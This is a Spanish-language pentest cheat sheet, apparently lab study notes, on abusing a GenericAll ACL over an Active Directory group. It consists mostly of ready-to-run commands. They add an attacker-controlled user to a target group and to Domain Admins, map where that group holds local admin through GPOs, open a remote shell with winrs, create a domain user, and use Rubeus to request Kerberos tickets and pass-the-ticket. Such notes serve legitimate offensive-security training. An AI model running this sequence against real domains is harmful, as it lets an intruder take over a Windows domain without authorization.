# Abuso ACL 

Tags: #AD #ACL #Windows 

## GenericAll sobre Grupo

Si tenemos esta ACL sobre un grupo, tenemos control total sobre el objeto grupo, lo que permite modificar su membresia. En este flujo, utilizamos ese control para agregar usuarios al grupo Domain Admins, obteniendo así los privilegios asociados a sus miembros.

## Active Directory Module 

* [Módulo AD](https://github.com/samratashok/ADModule/blob/master/ActiveDirectory/ActiveDirectory.psd1)

```powershell
❯ . .\ActiveDirectory.psd1

Paso 1:
# Agregar el usuario al grupo target 
❯ Add-ADGroupMember -Identity Target_group -Members omar -Verbose
	
	# Identity = Grupo sobre el que se tiene la ACL
	# Members = El usuario a agregar al grupo 

Verbose:
	Performing the operation "set" on target "CN=MachineAdminis,OU=Mgmt,DC=us,DC=techcorp,DC=local"

# Identificar máquinas 
❯ Get-ADComputer -SearchBase 'OU=Mgmt,DC=us,DC=techcorp,DC=local' -Filter * | select Name

# Identificar dónde MachineAdmins es admin local (vía GPO / Restricted Groups)
❯ Get-DomainGPOLocalGroup
❯ Get-DomainGPOUserLocalGroupMapping -Identity MachineAdmins -Verbose
❯ Find-DomainLocalGroupMember -GroupName Administrators | ?{$_.MemberName -match "MachineAdmins"}

Donde:
	- OU te dice qué máquinas hay ahí. Si enumeras las computadoras de la OU Mgmt, aparece us-mgmt.
	- Una GPO te dice quién es admin local ahí. Lo típico es que una GPO linkeada a OU=Mgmt use Restricted Groups para meter a MachineAdmins en el grupo local Administrators de esas máquinas. Así, ser miembro de MachineAdmins = ser admin local de las máquinas de esa OU.
```

```powershell 
Paso 2: 
# Ingresar al server del grupo  
❯ winrs -r:us-mgmt cmd 


NOTA: 
	- Desloggearse y volverse a loggear para que se apliquen los cambios 
```

## Net 

```powershell 
# Crear un usuario en el dominio (OPCIONAL) y agregarlo al grupo 
❯ net user omar 'P@$$w0rd123!' /add /domain 
❯ net user omar    # Verificar el usuario 
```

```powershell
# Paso 1: Agregar el usuario controlado al grupo Domain Admins
❯ net group "domain admins" ControlledAccount /add /domain

# Paso 2: Verificar que el usuario fue agregado correctamente
❯ net group "domain admins" /domain
```

```powershell 
# Paso 3: Si necesitas autenticarte como la cuenta controlada, solicitar un TGT con su contraseña y hacer Pass-The-Ticket
❯ .\Rubeus.exe asktgt /user:groupwrite.user /password:Password@1 /ptt

# Alternativa: solicitar el TGT utilizando el hash RC4
❯ .\Rubeus.exe hash /password:Password@1
❯ .\Rubeus.exe asktgt /user:groupwrite.user /rc4:<RC4_HASH> /ptt

# Paso 4: Verificar los tickets Kerberos
❯ klist
```